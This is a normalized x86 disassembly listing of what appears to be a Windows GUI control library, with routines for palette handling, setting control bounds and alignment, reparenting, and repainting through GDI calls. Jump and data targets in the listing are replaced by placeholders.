push eax
push edi
push esi
call SelectPalette
mov edi eax
push esi
call RealizePalette
test eax eax
je r-xdata
push 0xffffffff
push edi
push esi
call SelectPalette
push esi
mov eax [ esp + 0x8 ]
push eax
call ReleaseDC
mov bl 0x1
mov eax ebp
mov edx [ eax ]
call [ edx + 0x7c ]
sub_43d4a0
push ebx
push ecx
mov [ esp ] dl
mov ebx eax
mov al [ esp ]
cmp al [ ebx + 0x61 ]
je r-xdata
pop edx
pop ebx
retn
mov al [ esp ]
mov [ ebx + 0x61 ] al
mov eax ebx
call sub_43d7a0
sub_43d4c0
push ebx
push esi
push edi
mov edi edx
mov ebx eax
test edi edi
jne r-xdata
or [ ebx + 0x50 ] 0x8000
cmp [ ebx + 0x6c ] 0x0
jne r-xdata
mov eax [ ebx + 0x6c ]
call sub_403290
xor eax eax
mov [ ebx + 0x6c ] eax
and [ ebx + 0x50 ] 0xffff7fff
jmp r-xdata
mov edx edi
mov eax [ ebx + 0x6c ]
mov ecx [ eax ]
call [ ecx + 0xc ]
mov eax [ ebx + 0x6c ]
mov [ eax + 0xc ] ebx
mov [ eax + 0x8 ] sub_440150
test [ edi + 0x1c ] 0x1
setne cl
mov edx edi
mov eax ebx
mov si 0xffef
call sub_40348c
mov edx ebx
mov eax edi
call sub_4194fc
mov eax ebx
mov si 0xffd9
call sub_40348c
mov ecx ebx
mov dl 0x1
call [ eax + 0x14 ]
mov [ ebx + 0x6c ] eax
pop edi
pop esi
pop ebx
retn
sub_43d588
push ebx
push esi
push edi
mov esi edx
mov ebx eax
or [ ebx + 0x54 ] 0x8
mov edi [ esi + 0x2c ]
mov eax edi
mov edx [ r-xdata ]
call sub_40341c
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_41988c
and [ ebx + 0x54 ] 0xfff7
cmp [ ebx + 0x30 ] 0x0
je r-xdata
mov edx edi
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x68 ]
pop edi
pop esi
pop ebx
retn
push 0x0
xor ecx ecx
mov edx 0xb009
mov eax ebx
call sub_43f334
push 0x0
xor ecx ecx
mov edx 0xb008
mov eax ebx
call sub_43f334
push 0x0
xor ecx ecx
mov edx 0xb023
mov eax ebx
call sub_43f334
push 0x0
xor ecx ecx
mov edx 0xb035
mov eax ebx
call sub_43f334
push 0x0
xor ecx ecx
mov edx 0xb03d
mov eax ebx
call sub_43f334
sub_43d61c
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
mov ecx ebx
mov edx edi
mov eax esi
call sub_419748
cmp bl 0x1
jne r-xdata
pop edi
pop esi
pop ebx
retn
cmp edi [ esi + 0x7c ]
jne r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x3c ]
cmp edi eax
jne r-xdata
xor edx edx
mov eax esi
call sub_43e104
jmp r-xdata
xor edx edx
mov eax esi
call sub_43d4c0
sub_43d660
push ebx
push esi
push edi
push ecx
mov ebx edx
mov edi eax
mov al [ edi + 0x5b ]
cmp bl al
je r-xdata
mov eax edi
mov si 0xffd0
call sub_40348c
pop edx
pop edi
pop esi
pop ebx
retn
mov [ esp ] al
mov [ edi + 0x5b ] bl
xor eax eax
mov al bl
mov dl [ eax + rw-data ]
mov eax edi
call sub_43d4a0
test [ edi + 0x1c ] 0x1
jne r-xdata
test [ edi + 0x1c ] 0x10
je r-xdata
cmp bl 0x6
je r-xdata
cmp [ edi + 0x30 ] 0x0
je r-xdata
cmp [ esp ] 0x6
je r-xdata
mov al [ esp ]
dec eax
sub al 0x2
setb al
mov edx ebx
add dl 0xfd
sub dl 0x2
setb dl
cmp al dl
jne r-xdata
mov eax edi
mov si 0xffee
call sub_40348c
mov al [ esp ]
test al al
je r-xdata
sub al 0x5
je r-xdata
test bl bl
je r-xdata
sub bl 0x5
je r-xdata
mov eax [ edi + 0x4c ]
push eax
mov eax [ edi + 0x48 ]
push eax
mov ecx [ edi + 0x44 ]
mov edx [ edi + 0x40 ]
mov eax edi
mov ebx [ eax ]
call [ ebx + 0x84 ]
jmp r-xdata
sub_43d708
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
lea ecx [ ebp + 0x8 ]
lea edx [ ebp + 0xc ]
mov eax ebx
call sub_43f8c4
test al al
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
cmp esi [ ebx + 0x40 ]
jne r-xdata
xor ecx ecx
mov dl [ ebx + 0x57 ]
mov eax ebx
call sub_43e594
mov [ ebx + 0x40 ] esi
mov [ ebx + 0x44 ] edi
mov eax [ ebp + 0xc ]
mov [ ebx + 0x48 ] eax
mov eax [ ebp + 0x8 ]
mov [ ebx + 0x4c ] eax
mov eax ebx
call sub_43d7a0
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
push 0x0
xor ecx ecx
mov edx 0x47
mov eax ebx
call sub_43f334
mov eax ebx
mov si 0xffd0
call sub_40348c
test [ ebx + 0x1c ] 0x1
jne r-xdata
cmp edi [ ebx + 0x44 ]
jne r-xdata
mov eax ebx
mov si 0xffcf
call sub_40348c
mov eax [ ebp + 0xc ]
cmp eax [ ebx + 0x48 ]
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp eax [ ebx + 0x4c ]
je r-xdata
sub_43d7a0
push ebx
push esi
add esp 0xfffffff0
mov esi eax
cmp [ esi + 0x62 ] 0x0
jne r-xdata
add esp 0x10
pop esi
pop ebx
retn
test [ esi + 0x1c ] 0x1
jne r-xdata
mov bl [ esi + 0x61 ]
mov al [ r-xdata ]
cmp al bl
jne r-xdata
test bl 0x4
je r-xdata
xor eax eax
mov [ esi + 0x90 ] eax
xor eax eax
mov [ esi + 0x94 ] eax
jmp r-xdata
mov eax [ esi + 0x48 ]
sar eax 0x1
jns r-xdata
test bl 0x1
je r-xdata
add eax [ esi + 0x40 ]
mov [ esi + 0x88 ] eax
adc eax 0x0
mov eax [ esi + 0x40 ]
mov [ esi + 0x88 ] eax
jmp r-xdata
mov eax [ esi + 0x48 ]
mov [ esi + 0x88 ] eax
jmp r-xdata
mov eax [ esi + 0x4c ]
sar eax 0x1
jns r-xdata
test bl 0x2
je r-xdata
test bl 0x8
je r-xdata
add eax [ esi + 0x44 ]
mov [ esi + 0x8c ] eax
adc eax 0x0
mov eax [ esi + 0x44 ]
mov [ esi + 0x8c ] eax
jmp r-xdata
mov eax [ esi + 0x4c ]
mov [ esi + 0x8c ] eax
jmp r-xdata
test [ ebx + 0x1c ] 0x2
je r-xdata
mov ebx [ esi + 0x30 ]
test ebx ebx
je r-xdata
mov eax ebx
call sub_444c6c
test al al
je r-xdata
test [ esi + 0x1c ] 0x10
jne r-xdata
mov eax [ esi + 0x30 ]
mov eax [ eax + 0x48 ]
mov [ esi + 0x90 ] eax
mov eax [ esi + 0x30 ]
mov eax [ eax + 0x4c ]
mov [ esi + 0x94 ] eax
mov edx esp
mov eax [ esi + 0x30 ]
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ esp + 0x8 ]
mov [ esi + 0x90 ] eax
mov eax [ esp + 0xc ]
mov [ esi + 0x94 ] eax
jmp r-xdata
mov eax [ ebx + 0x1fa ]
mov [ esi + 0x90 ] eax
mov eax [ ebx + 0x1fe ]
mov [ esi + 0x94 ] eax
jmp r-xdata
sub_43d8bc
push ebx
push esi
mov esi eax
mov eax [ esi + 0x48 ]
push eax
mov eax [ esi + 0x4c ]
push eax
mov ecx [ esi + 0x44 ]
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x84 ]
or [ esi + 0x98 ] 0x1
pop esi
pop ebx
retn
sub_43d8e0
push ebx
push esi
mov esi eax
mov eax [ esi + 0x48 ]
push eax
mov eax [ esi + 0x4c ]
push eax
mov ecx edx
mov eax esi
mov edx [ esi + 0x40 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
or [ esi + 0x98 ] 0x2
pop esi
pop ebx
retn
sub_43d908
push ebx
push esi
mov esi eax
push edx
mov eax [ esi + 0x4c ]
push eax
mov ecx [ esi + 0x44 ]
mov eax esi
mov edx [ esi + 0x40 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
or [ esi + 0x98 ] 0x4
pop esi
pop ebx
retn
sub_43d92c
push ebx
push esi
mov esi eax
mov eax [ esi + 0x48 ]
push eax
push edx
mov ecx [ esi + 0x44 ]
mov eax esi
mov edx [ esi + 0x40 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
or [ esi + 0x98 ] 0x8
pop esi
pop ebx
retn
sub_43d950
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
mov esi ecx
lea edi [ ebp - 0x14 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp ebx [ eax + 0xa0 ]
je r-xdata
mov eax [ ebp - 0x4 ]
or [ eax + 0x54 ] 0x400
xor edx edx
push ebp
push sub_43da4b
push [ fs : edx ]
mov [ fs : edx ] esp
cmp ebx 0xffffffff
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xa0 ]
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xa0 ]
cmp ebx eax
je r-xdata
lea ecx [ ebp - 0x14 ]
mov edx ebx
mov eax [ ebp - 0x4 ]
mov si 0xffe4
call sub_40348c
test ebx ebx
je r-xdata
cmp [ eax + 0x178 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43da52
mov eax [ ebp - 0x4 ]
and [ eax + 0x54 ] 0xfbff
retn
mov edi eax
cmp ebx 0xffffffff
je r-xdata
cmp ebx 0xffffffff
je r-xdata
mov eax [ eax + 0x178 ]
mov edx [ ebp - 0x4 ]
call sub_413bb8
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0xa0 ] edx
mov eax [ ebp - 0x4 ]
mov [ eax + 0xa0 ] ebx
test ebx ebx
je r-xdata
cmp [ ebx + 0x178 ] 0x0
je r-xdata
mov edx [ ebp - 0x4 ]
mov eax edi
mov si 0xffbf
call sub_40348c
test edi edi
je r-xdata
lea ecx [ ebp - 0x14 ]
mov edx [ ebp - 0x4 ]
mov eax ebx
mov si 0xffc5
call sub_40348c
jmp r-xdata
mov eax [ ebx + 0x178 ]
mov edx [ ebp - 0x4 ]
call sub_413918
sub_43da5c
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ r-xdata ]
call sub_40341c
test al al
jne r-xdata
cmp esi [ ebx + 0x30 ]
je r-xdata
xor ecx ecx
mov dl [ ebx + 0x57 ]
mov eax ebx
call sub_43e594
mov edx edi
mov eax ebx
call sub_43db0c
mov edx edi
mov eax ebx
call sub_43f3d8
jmp r-xdata
xor edx edx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x68 ]
cmp esi 0xffffffff
jne r-xdata
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
retn
sub_43dac8
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx + 0x1c ] 0x1
jne r-xdata
lea eax [ ebx + 0x154 ]
mov edx esi
call sub_404034
pop esi
pop ebx
retn
mov [ ebx + 0x150 ] 0x0
sub_43db0c
push ebx
push esi
push edi
push ebp
mov esi eax
mov eax [ edx + 0x8 ]
mov edi [ edx ]
sub eax edi
push eax
mov eax [ edx + 0xc ]
mov ebp [ edx + 0x4 ]
sub eax ebp
push eax
mov ecx ebp
mov edx edi
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x84 ]
pop ebp
pop edi
pop esi
pop ebx
retn
sub_43db68
push ebx
push esi
add esp 0xfffffff8
mov esi edx
mov ebx eax
mov eax ebx
call sub_43db94
mov edx eax
mov ecx esp
mov eax esi
call sub_412618
mov edx esp
mov eax ebx
call sub_43dfd8
pop ecx
pop edx
pop esi
pop ebx
retn
sub_43dbac
push ebx
push esi
add esp 0xfffffff8
mov esi edx
mov ebx eax
mov eax ebx
call sub_43db50
mov ecx esp
mov edx esi
call sub_412618
mov edx esp
mov eax ebx
call sub_43dfd8
pop ecx
pop edx
pop esi
pop ebx
retn
sub_43dbd4
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_43dc55
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x30 ] 0x0
jne r-xdata
mov edx esi
mov eax [ ebx + 0x30 ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov eax [ ebx + 0x40 ]
add [ esi ] eax
mov eax [ ebx + 0x44 ]
add [ esi + 0x4 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43dc5c
lea eax [ ebp - 0xc ]
call sub_403fe0
retn
mov eax [ ebx + 0x8 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0xb
lea eax [ ebp - 0x8 ]
push eax
push 0x0
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_405b10
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b4cc
call sub_403a1c
sub_43dc64
push ebx
push esi
push edi
add esp 0xfffffff8
mov edi ecx
mov esi edx
mov ebx eax
mov edx esp
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov eax [ esi ]
add eax [ esp ]
mov [ edi ] eax
mov eax [ esi + 0x4 ]
add eax [ esp + 0x4 ]
mov [ edi + 0x4 ] eax
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
sub_43dc90
push ebx
push esi
push edi
add esp 0xfffffff8
mov edi ecx
mov esi edx
mov ebx eax
mov edx esp
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov eax [ esi ]
sub eax [ esp ]
mov [ edi ] eax
mov eax [ esi + 0x4 ]
sub eax [ esp + 0x4 ]
mov [ edi + 0x4 ] eax
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
sub_43dcbc
push ebx
push esi
mov esi edx
mov ebx eax
test ebx ebx
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
mov edx [ r-xdata ]
call sub_40341c
test al al
je r-xdata
mov ebx [ ebx + 0x30 ]
test ebx ebx
jne r-xdata
mov edx esi
mov eax ebx
call sub_4594c8
sub_43dcec
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
mov esi [ ebx + 0xa0 ]
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
cmp [ rw-data ] 0x0
jne r-xdata
mov ax [ r-xdata ]
and ax [ ebx + 0x1c ]
mov dx [ r-xdata ]
cmp dx ax
jne r-xdata
mov [ ebp - 0x10 ] edi
mov eax [ ebp - 0x4 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x8 ] eax
lea eax [ ebp - 0x10 ]
push eax
mov ecx ebx
mov edx 0xb042
mov eax esi
call sub_43f334
sub_43dd68
push ebx
push esi
push edi
push ebp
add esp 0xfffffff0
mov [ esp ] ecx
mov edi edx
mov esi eax
cmp edi [ esp ]
je r-xdata
mov al [ r-xdata ]
mov [ esi + 0x98 ] al
add esp 0x10
pop ebp
pop edi
pop esi
pop ebx
retn
test [ esi + 0x1c ] 0x1
je r-xdata
mov bl [ r-xdata ]
mov bl [ esi + 0x98 ]
jmp r-xdata
mov ebp [ esi + 0x40 ]
mov eax [ esp ]
push eax
push edi
mov eax [ esi + 0x40 ]
push eax
call sub_406118
mov ebp eax
jmp r-xdata
test bl 0x1
je r-xdata
mov eax [ esi + 0x44 ]
mov [ esp + 0x4 ] eax
mov eax [ esp ]
push eax
push edi
mov eax [ esi + 0x44 ]
push eax
call sub_406118
mov [ esp + 0x4 ] eax
jmp r-xdata
test bl 0x2
je r-xdata
mov eax [ esi + 0x48 ]
mov [ esp + 0x8 ] eax
test [ esi + 0x51 ] 0x1
jne r-xdata
test bl 0x4
je r-xdata
mov eax [ esi + 0x4c ]
mov [ esp + 0xc ] eax
test [ esi + 0x51 ] 0x2
jne r-xdata
test bl 0x1
je r-xdata
mov eax ebx
and al [ r-xdata ]
mov dl [ r-xdata ]
cmp dl al
je r-xdata
mov eax [ esp ]
push eax
push edi
mov eax [ esi + 0x90 ]
push eax
call sub_406118
mov [ esi + 0x90 ] eax
test bl 0x8
setne dl
test al al
je r-xdata
mov eax [ esp ]
push eax
push edi
mov eax [ esi + 0x48 ]
push eax
call sub_406118
mov [ esp + 0x8 ] eax
jmp r-xdata
mov eax [ esp ]
push eax
push edi
mov eax [ esi + 0x40 ]
add eax [ esi + 0x48 ]
push eax
call sub_406118
sub eax ebp
mov [ esp + 0x8 ] eax
jmp r-xdata
cmp [ esi + 0x59 ] 0x0
jne r-xdata
mov eax [ esp ]
push eax
push edi
mov eax [ esi + 0x94 ]
push eax
call sub_406118
mov [ esi + 0x94 ] eax
mov eax [ esp ]
push eax
push edi
mov eax [ esi + 0x44 ]
push eax
call sub_406118
mov [ esp + 0xc ] eax
jmp r-xdata
mov eax [ esp ]
push eax
push edi
mov eax [ esi + 0x44 ]
add eax [ esi + 0x4c ]
push eax
call sub_406118
sub eax [ esp + 0x4 ]
mov [ esp + 0xc ] eax
jmp r-xdata
test bl 0x8
setne al
test al al
je r-xdata
test bl 0x10
je r-xdata
mov eax [ esp + 0x8 ]
push eax
mov eax [ esp + 0x10 ]
push eax
mov ecx [ esp + 0xc ]
mov edx ebp
mov eax esi
mov ebp [ eax ]
call [ ebp + 0x84 ]
mov eax ebx
and al [ r-xdata ]
mov dl [ r-xdata ]
cmp dl al
je r-xdata
mov eax [ esp ]
push eax
push edi
mov ebx [ esi + 0x68 ]
mov eax ebx
call sub_41c9ac
push eax
call sub_406118
mov edx eax
mov eax ebx
call sub_41c9c8
sub_43df34
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov edi eax
xor eax eax
push ebp
push sub_43dfca
push [ fs : eax ]
mov [ fs : eax ] esp
test [ edi + 0x50 ] 0x20
je r-xdata
xor ebx ebx
jmp r-xdata
test [ edi + 0x1c ] 0x1
jne r-xdata
mov edx [ ebp - 0x4 ]
mov eax edi
call sub_419984
test bl bl
je r-xdata
lea edx [ ebp - 0x8 ]
mov eax edi
call sub_43e14c
mov edx [ ebp - 0x8 ]
mov eax [ edi + 0x8 ]
call sub_4043ec
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43dfd1
lea eax [ ebp - 0x8 ]
call sub_403fe0
retn
mov edx [ ebp - 0x4 ]
mov eax edi
call sub_43e17c
mov esi [ edi + 0x4 ]
test esi esi
je r-xdata
mov bl 0x1
mov eax esi
mov edx [ r-xdata ]
call sub_40341c
test al al
je r-xdata
test [ esi + 0x1c ] 0x1
je r-xdata
sub_43dfd8
push ebx
push esi
push edi
add esp 0xffffffe8
mov esi edx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ebx eax
lea edx [ esp + 0x8 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ ebx + 0x48 ]
sub eax [ esp + 0x10 ]
add eax [ esp ]
push eax
mov eax [ ebx + 0x4c ]
sub eax [ esp + 0x18 ]
add eax [ esp + 0x8 ]
push eax
mov ecx [ ebx + 0x44 ]
mov edx [ ebx + 0x40 ]
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x84 ]
add esp 0x18
pop edi
pop esi
pop ebx
retn
sub_43e020
push ebx
push esi
mov esi edx
mov ebx eax
cmp esi [ ebx + 0x30 ]
je r-xdata
pop esi
pop ebx
retn
cmp ebx esi
jne r-xdata
mov eax [ ebx + 0x30 ]
test eax eax
je r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b54c
call sub_403a1c
test esi esi
je r-xdata
mov edx ebx
call sub_4415e0
mov edx ebx
mov eax esi
call sub_44150c
mov eax ebx
call sub_43d7a0
sub_43e06c
push ebx
push esi
push edi
mov ebx edx
mov edi eax
cmp bl [ edi + 0x57 ]
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax edi
mov si 0xffcd
call sub_40348c
mov [ edi + 0x57 ] bl
push 0x0
xor ecx ecx
mov cl bl
mov edx 0xb00b
mov eax edi
call sub_43f334
mov eax edi
mov si 0xffd0
call sub_40348c
sub_43e104
push ebx
push esi
mov esi edx
mov ebx eax
mov [ ebx + 0x7c ] esi
test esi esi
je r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
call sub_452444
mov edx ebx
mov eax esi
call sub_4194fc
sub_43e128
push ebx
mov ebx eax
push edx
xor ecx ecx
mov eax ebx
mov edx 0xc
call sub_43f334
push 0x0
xor ecx ecx
mov edx 0xb012
mov eax ebx
call sub_43f334
pop ebx
retn
sub_43e14c
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov eax esi
call sub_43e0c0
mov ebx eax
mov eax edi
mov ecx ebx
xor edx edx
call sub_4040d0
test ebx ebx
je r-xdata
pop edi
pop esi
pop ebx
retn
lea ecx [ ebx + 0x1 ]
mov edx [ edi ]
mov eax esi
call sub_43e0d0
sub_43e17c
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_43e1d1
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_43e14c
mov eax [ ebp - 0x4 ]
mov edx esi
call sub_4043ec
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43e1d8
lea eax [ ebp - 0x4 ]
call sub_403fe0
retn
mov eax esi
call sub_4044a0
mov edx eax
mov eax ebx
call sub_43e128
sub_43e1fc
push ebx
mov ebx eax
mov [ ebx + 0x59 ] 0x0
mov [ ebx + 0x56 ] 0x0
mov eax [ ebx + 0x68 ]
call sub_41c908
cmp eax [ ebx + 0x84 ]
je r-xdata
push 0x0
xor ecx ecx
mov edx 0xb00e
mov eax ebx
call sub_43f334
pop ebx
retn
or [ ebx + 0x98 ] 0x10
mov eax [ ebx + 0x68 ]
call sub_41c908
mov [ ebx + 0x84 ] eax
sub_43e384
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
call sub_43e374
cmp bl al
je r-xdata
pop esi
pop ebx
retn
test bl bl
je r-xdata
xor eax eax
call sub_43b31c
mov eax esi
call sub_43b31c
jmp r-xdata
sub_43e3bc
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x30 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax [ eax + 0x198 ]
mov edx ebx
call sub_413ad0
test eax eax
jl r-xdata
mov edx [ ebx + 0x30 ]
mov edi [ edx + 0x198 ]
mov edx [ edi + 0x8 ]
test esi esi
jge r-xdata
cmp edx esi
jg r-xdata
xor esi esi
cmp eax esi
je r-xdata
mov esi edx
dec esi
mov edx edi
xchg edx eax
call sub_413964
mov eax [ ebx + 0x30 ]
mov eax [ eax + 0x198 ]
mov ecx ebx
mov edx esi
call sub_413af0
mov cl 0x1
mov dl [ ebx + 0x57 ]
mov eax ebx
call sub_43e594
mov eax ebx
call sub_455418
test [ eax + 0x54 ] 0x4
je r-xdata
mov dl 0x1
mov si 0xffd1
call sub_40348c
sub_43e43c
mov ecx [ eax + 0x30 ]
test ecx ecx
je r-xdata
retn
test dl dl
je r-xdata
xor edx edx
call sub_43e3bc
mov edx [ ecx + 0x198 ]
mov edx [ edx + 0x8 ]
dec edx
call sub_43e3bc
jmp r-xdata
sub_43e460
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov ebx eax
xor eax eax
push ebp
push sub_43e4f6
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x30 ] 0x0
jne r-xdata
mov eax [ ebx + 0x30 ]
mov ecx [ eax ]
call [ ecx + 0x48 ]
mov esi eax
push 0x0
mov eax [ ebx + 0x44 ]
push eax
mov eax [ ebx + 0x40 ]
push eax
push esi
call SetViewportOrgEx
mov eax [ ebx + 0x4c ]
push eax
mov eax [ ebx + 0x48 ]
push eax
push 0x0
push 0x0
push esi
call IntersectClipRect
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43e4fd
lea eax [ ebp - 0xc ]
call sub_403fe0
retn
mov eax [ ebx + 0x8 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0xb
lea eax [ ebp - 0x8 ]
push eax
push 0x0
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_405b10
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b4cc
call sub_403a1c
sub_43e508
push ebp
mov ebp esp
add esp 0xffffffdc
push ebx
push esi
push edi
mov [ ebp - 0x1 ] 0x1
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x30 ]
mov edi [ eax + 0x198 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x4 ]
mov eax edi
call sub_413ad0
mov esi eax
test esi esi
jle r-xdata
mov [ ebp - 0x1 ] 0x0
dec esi
mov edx esi
mov eax edi
call sub_413a74
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
je r-xdata
test esi esi
jg r-xdata
test [ ebx + 0x50 ] 0x40
je r-xdata
lea edx [ ebp - 0x24 ]
mov eax ebx
call sub_43daec
lea eax [ ebp - 0x24 ]
push eax
mov eax [ ebp + 0x8 ]
add eax 0xffffffec
push eax
lea eax [ ebp - 0x11 ]
push eax
call IntersectRect
mov eax [ ebp + 0x8 ]
add eax 0xffffffec
push eax
lea eax [ ebp - 0x11 ]
push eax
call EqualRect
test eax eax
jne r-xdata
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_43e594
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
mov [ ebp - 0x15 ] cl
mov ebx edx
mov [ ebp - 0x4 ] eax
test bl bl
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x30 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
je r-xdata
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
call sub_444c6c
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x51 ] 0x4
jne r-xdata
lea edx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
call sub_43daec
cmp [ ebp - 0x15 ] 0x0
jne r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
test [ eax + 0x50 ] 0x40
jne r-xdata
neg al
sbb eax eax
push eax
lea eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
call sub_444968
push eax
call InvalidateRect
push ebp
call sub_43e508
pop ecx
test al al
je r-xdata
mov al 0x1
sub_43e630
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov eax ebx
call sub_4553f0
mov esi eax
test esi esi
je r-xdata
mov eax [ edi + 0x8 ]
push eax
mov ecx [ edi + 0x4 ]
mov edx 0xb043
mov eax ebx
call sub_43f334
mov [ edi + 0xc ] eax
cmp ebx esi
je r-xdata
mov edx edi
mov eax esi
mov si 0xffc9
call sub_40348c
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_43e694
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x57 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x30 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
je r-xdata
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
call sub_444c6c
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x51 ] 0x4
jne r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x50 ] 0x40
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x7c ]
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x88 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
call sub_444968
push eax
call GetDC
mov [ ebp - 0x8 ] eax
xor ecx ecx
push ebp
push sub_43e76d
push [ fs : ecx ]
mov [ fs : ecx ] esp
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x44 ]
mov ecx edx
mov ebx [ ebp - 0x4 ]
add ecx [ ebx + 0x4c ]
push ecx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x40 ]
mov ecx eax
mov ebx [ ebp - 0x4 ]
add ecx [ ebx + 0x48 ]
push ecx
push edx
push eax
mov eax [ ebp - 0x8 ]
push eax
call IntersectClipRect
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
mov ecx [ ebp - 0x4 ]
mov edx [ ebp - 0x8 ]
call sub_442774
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
